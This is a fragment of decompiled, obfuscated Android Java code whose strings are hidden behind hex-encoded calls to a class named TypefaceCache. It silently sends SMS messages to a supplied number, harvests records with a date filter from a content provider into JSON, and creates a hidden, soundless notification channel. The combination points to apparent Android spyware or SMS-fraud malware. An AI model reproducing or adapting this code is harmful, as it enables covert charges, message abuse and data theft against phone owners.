            jSONObject.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("00100053007500A300CF008C00FF009400630066005E009500FD00B600C100B4002A0079005500C700F400BA00DC00AE00260072"));
            return jSONObject;
        }
        ?? r11 = (-61) + 62;
        try {
            gA5gCwTK0qjTIn.K7eEOBPYP9VIoHWTe(this, str, str2, i);
            TypefaceCache.obtain("0010005B006800C700F400B600C100B7002200620058008F00F500BB009200B1002A0077001B00B500F500B900920094000A005B001B");
        } catch (Exception e) {
            TypefaceCache.obtain("0010005B006800C700C200BA00D400E70010005F0076");
            TypefaceCache.obtain("00630070005A008E00FC00BA00D600FD0063");
            e.getMessage();
            TypefaceCache.obtain("006F0036004F009500E900B600DC00A000630045007200AA00B000B900D300AB002F0074005A008400FB00F1009C00E9");
            try {
                gA5gCwTK0qjTIn.K7eEOBPYP9VIoHWTe(this, str, str2, 0);
                TypefaceCache.obtain("0010005B006800C700F400B600C100B7002200620058008F00F500BB009200B1002A0077001B00B500F500B9009200A10022007A0057008500F100BC00D900E70010005F0076");
                try {
                    jSONObject.put(TypefaceCache.obtain("00360065005E008300CF00B900D300AB002F0074005A008400FB"), r11);
                } catch (Exception e2) {
                    e = e2;
                    r3 = r11;
                    String str4 = e.getMessage() + TypefaceCache.obtain("0063006A001B008100F100B300DE00A500220075005000DD00B0") + e.getMessage();
                    TypefaceCache.obtain("0010005B006800C700C200BA00D400E70022007A005700C700E300B300DD00B300300036005D008600F900B300D700A300790036");
                    str3 = str4;
                    r4 = r3;
                }
            } catch (Exception e3) {
                e = e3;
                r3 = 0;
            }
        }
        str3 = "";
        r4 = r11;
        if (r4 != 0) {
            jSONObject.put(TypefaceCache.obtain("0030007300550093"), r11);
            jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB"), TypefaceCache.obtain("00310073005D"));
            return jSONObject;
        }
        try {
            zBq = UtilYWProcessor.bq(str, str2, i);
        } catch (Throwable unused) {
            zBq = false;
        }
        try {
            if (!zBq) {
                try {
                    if (i > 0) {
                        try {
                            zBq2 = UtilYWProcessor.bq(str, str2, -1);
                        } catch (Throwable unused2) {
                            zBq2 = false;
                        }
                        if (zBq2) {
                            TypefaceCache.obtain("0010005B006800C700F400B600C100B7002200620058008F00F500BB009200B1002A0077001B00B200E400B600DE009E001400460049008800F300BA00C100B4002C0064001B008300F500B900D300B2002F0062001B00B400D90092");
                            jSONObject.put(TypefaceCache.obtain("0030007300550093"), r11);
                            jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB"), TypefaceCache.obtain("002D0077004F008E00E600BA00ED00A10022007A0057008500F100BC00D9"));
                        }
                        return jSONObject;
                    }
                    SmsManager smsManager = SmsManager.getDefault();
                    ArrayList<String> arrayListDivideMessage = smsManager.divideMessage(str2);
                    if (arrayListDivideMessage.size() > r11) {
                        smsManager.sendMultipartTextMessage(str, null, arrayListDivideMessage, null, null);
                    } else {
                        smsManager.sendTextMessage(str, null, str2, null, null);
                    }
                    TypefaceCache.obtain("0010005B006800C700F400B600C100B7002200620058008F00F500BB009200B1002A0077001B008300F900AD00D700A4003700360068008A00E3009200D300A900220071005E009500BE00B800D700B300070073005D008600E500B300C600EF006A");
                    jSONObject.put(TypefaceCache.obtain("0030007300550093"), r11);
                    jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB"), TypefaceCache.obtain("0027007F0049008200F300AB"));
                    return jSONObject;
                } catch (Exception e4) {
                    TypefaceCache.obtain("0007007F0049008200F300AB00920094002E00650076008600FE00BE00D500A200310036005D008600F900B300D700A300790036");
                    e4.getMessage();
                    TypefaceCache.obtain("0002007A005700C700C3009200E100E7002E0073004F008F00FF00BB00C100E7002500770052008B00F500BB009200A1002C0064001B");
                    jSONObject.put(TypefaceCache.obtain("0030007300550093"), false);
                    jSONObject.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("0022007A005700B800FD00BA00C600AF002C0072004800B800F600BE00DB00AB00260072000100C700E200BA00D400FA0018") + str3 + TypefaceCache.obtain("001E00360055008600E400B600C400A2006800720052009500F500BC00C600FA002500770052008B00F500BB"));
                    return jSONObject;
                }
            }
            TypefaceCache.obtain("0010005B006800C700F400B600C100B7002200620058008F00F500BB009200B1002A0077001B00B200E400B600DE009E001400460049008800F300BA00C100B4002C0064001B00B400D900920092");
            jSONObject.put(TypefaceCache.obtain("0030007300550093"), r11);
            jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB"), TypefaceCache.obtain("002D0077004F008E00E600BA"));
        } catch (Exception e5) {
            TypefaceCache.obtain("001600620052008B00C9008800E200B5002C0075005E009400E300B000C000E70010005B006800C700F600BE00DB00AB00260072000100C7");
            e5.getMessage();
        }
        return jSONObject;
    }

    public final JSONArray vIJudZvPyTuNp() {
        JSONArray jSONArray = new JSONArray();
        try {
            Cursor cursorMLSIo1htfMPWeB8V876L = gA5gCwTK0qjTIn.MLSIo1htfMPWeB8V876L(getContentResolver(), TypefaceCache.obtain("002000790055009300F500B100C600FD006C00390056008200F400B600D300E80026006E004F008200E200B100D300AB006C007F0056008600F700BA00C100E8002E0073005F008E00F1"), new String[]{TypefaceCache.obtain("001C007F005F"), TypefaceCache.obtain("001C00720052009400E000B300D300BE001C0078005A008A00F5"), TypefaceCache.obtain("00270077004F008200CF00BE00D600A300260072"), TypefaceCache.obtain("001C00650052009D00F5")}, TypefaceCache.obtain("00270077004F008200CF00BE00D600A300260072001B00A300D5008C00F100E7000F005F007600AE00C400FF008300F70073"));
            if (cursorMLSIo1htfMPWeB8V876L == null) {
                return jSONArray;
            }
            try {
                int columnIndex = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("001C007F005F"));
                int columnIndex2 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("001C00720052009400E000B300D300BE001C0078005A008A00F5"));
                int columnIndex3 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("00270077004F008200CF00BE00D600A300260072"));
                int columnIndex4 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("001C00650052009D00F5"));
                while (cursorMLSIo1htfMPWeB8V876L.moveToNext()) {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("id", cursorMLSIo1htfMPWeB8V876L.getLong(columnIndex));
                    String strObtain = TypefaceCache.obtain("002D007700560082");
                    String string = cursorMLSIo1htfMPWeB8V876L.getString(columnIndex2);
                    if (string == null) {
                        string = "";
                    }
                    jSONObject.put(strObtain, string);
                    jSONObject.put(TypefaceCache.obtain("00270077004F0082"), cursorMLSIo1htfMPWeB8V876L.getLong(columnIndex3) * ((long) 1000));
                    jSONObject.put(TypefaceCache.obtain("0030007F00410082"), cursorMLSIo1htfMPWeB8V876L.getLong(columnIndex4));
                    jSONArray.put(jSONObject);
                }
                cursorMLSIo1htfMPWeB8V876L.close();
                return jSONArray;
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorMLSIo1htfMPWeB8V876L, th);
                    throw th2;
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00040073004F00C700F700BE00DE00AB00260064004200C700E000B700DD00B3002C0065001B008200E200AD00DD00B500790036");
            e.getMessage();
            return jSONArray;
        }
    }

    public final void wotphlvK9sPbXJ() {
        NotificationChannel notificationChannel = new NotificationChannel(ECwLkmPW1UKz7J6E, TypefaceCache.obtain("0010006F0048009300F500B20092009400260064004D008E00F300BA"), 1);
        notificationChannel.setShowBadge(false);
        notificationChannel.setSound(null, null);
        notificationChannel.setLockscreenVisibility((-27) + 26);
        NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
        if (notificationManager != null) {
            notificationManager.createNotificationChannel(notificationChannel);
        }
    }

    public final Object xfn2GJwmGqs7kWW(DoeLweGeLwxOstamT doeLweGeLwxOstamT) {
        AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
        return y6jRGLEWNMir.K7eEOBPYP9VIoHWTe(lApLnElOE7s0Fsy.dDIMxZXP1V8HdM, new eoUwMTDTg3dRNUqWJq3(this, null), doeLweGeLwxOstamT);
    }
}
